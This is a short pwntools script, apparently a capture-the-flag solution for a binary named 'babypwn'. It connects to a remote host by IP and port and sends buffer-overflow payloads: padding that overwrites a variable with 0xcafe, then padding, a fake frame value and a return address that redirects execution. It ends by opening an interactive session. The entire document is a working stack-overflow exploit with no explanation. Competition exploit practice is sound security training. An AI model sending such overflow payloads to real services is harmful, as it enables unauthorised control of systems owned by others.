from pwn import *
#p = process('./babypwn')
#gdb.attach('babypwn')
p = remote('185.239.107.54', 7010)
exp = "A"*28
exp += p64(0xcafe)
p.sendline(exp)
wow = 0x0000000004012EC
exp = "A"*0x80+p64(1)+p64(wow)
p.sendlineafter('self ;;)',exp)
p.interactive()
